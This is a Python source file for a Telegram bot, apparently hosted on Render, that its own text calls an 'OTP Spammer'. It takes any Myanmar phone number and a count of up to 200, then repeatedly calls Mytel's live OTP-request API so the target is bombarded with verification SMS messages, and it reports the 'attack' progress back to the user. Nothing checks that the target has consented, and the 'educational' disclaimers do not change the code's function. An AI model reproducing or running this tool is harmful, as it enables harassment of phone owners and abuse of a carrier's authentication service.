import os
import requests
import logging
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ConversationHandler, MessageHandler, filters, ContextTypes

# ---------- CONFIG ----------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # set this in Render environment variables
if not TOKEN:
    raise ValueError("No TELEGRAM_BOT_TOKEN found in environment")

WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL")  # provided by Render automatically
if not WEBHOOK_URL:
    # fallback for local testing
    WEBHOOK_URL = "https://your-app.onrender.com"

# Conversation states
PHONE, COUNT = range(2)

# ---------- Helper: OTP attack ----------
async def send_otp_attack(phone: str, count: int, update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Perform the OTP requests and report result to user."""
    # Validate phone format (Myanmar: starts with 09 and total 11 digits)
    if not (phone.startswith("09") and len(phone) == 11):
        await update.message.reply_text("❌ Invalid phone number. Must be 11 digits starting with 09 (without +95).")
        return False

    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}"
    success_count = 0

    # Send initial status
    status_msg = await update.message.reply_text(f"🚀 Starting OTP attack on {phone}\nTotal attempts: {count}\nProgress: 0/{count}")

    for i in range(1, count + 1):
        try:
            resp = requests.get(url, timeout=4)
            if resp.status_code == 200:
                success_count += 1
        except Exception:
            pass  # ignore network errors, just continue

        # Update progress every 5 requests (to avoid spam)
        if i % 5 == 0 or i == count:
            await status_msg.edit_text(f"🚀 OTP attack on {phone}\nAttempts: {i}/{count}\nSuccessful: {success_count}")

    await status_msg.edit_text(
        f"✅ **Attack finished**\n"
        f"Target: `{phone}`\n"
        f"Total attempts: {count}\n"
        f"Successful OTP sends: {success_count}\n"
        f"⚠️ This tool is for educational purposes only."
    )
    return True

# ---------- Conversation Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Welcome to OTP Tester Bot**\n\n"
        "⚠️ This bot is for authorised testing only.\n\n"
        "Use /attack to start an OTP request sequence.\n\n"
        f"👨‍💻 Developer: @Ace_TM0\n"
        f"🏢 Organization: Myanmar Cyber Security\n"
        f"🛠️ Tool: OTP Spammer (educational)"
    )

async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 Please send the target phone number (11 digits, starting with 09):")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    # Basic validation
    if not (phone.startswith("09") and len(phone) == 11 and phone.isdigit()):
        await update.message.reply_text("❌ Invalid format. Must be 11 digits starting with 09. Try again or /cancel.")
        return PHONE
    context.user_data["phone"] = phone
    await update.message.reply_text("🔢 How many OTP requests do you want to send? (enter a number, e.g., 10)")
    return COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text.strip())
        if count <= 0 or count > 200:   # safety limit
            await update.message.reply_text("Please enter a number between 1 and 200.")
            return COUNT
    except ValueError:
        await update.message.reply_text("Please enter a valid number.")
        return COUNT

    phone = context.user_data["phone"]
    await update.message.reply_text(f"⏳ Starting attack on {phone} with {count} attempts...")
    await send_otp_attack(phone, count, update, context)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled.")
    return ConversationHandler.END

# ---------- Flask + Webhook Setup ----------
app = Flask(__name__)

async def setup_webhook(application: Application):
    """Set webhook once when the Flask app starts."""
    await application.bot.set_webhook(WEBHOOK_URL + f"/webhook/{TOKEN}")
    logging.info(f"Webhook set to {WEBHOOK_URL}/webhook/{TOKEN}")

def run_bot():
    """Initialize the Telegram bot and attach webhook."""
    # Build Application
    application = Application.builder().token(TOKEN).build()

    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)

    # Set webhook (async but we run it synchronously inside Flask startup)
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(setup_webhook(application))

    # Flask endpoint to receive updates
    @app.route(f"/webhook/{TOKEN}", methods=["POST"])
    async def webhook():
        json_data = request.get_json(force=True)
        update = Update.de_json(json_data, application.bot)
        await application.process_update(update)
        return "OK"

    @app.route("/", methods=["GET"])
    def health():
        return "Bot is alive"

    # Start Flask server (Render expects a web server)
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    run_bot()        
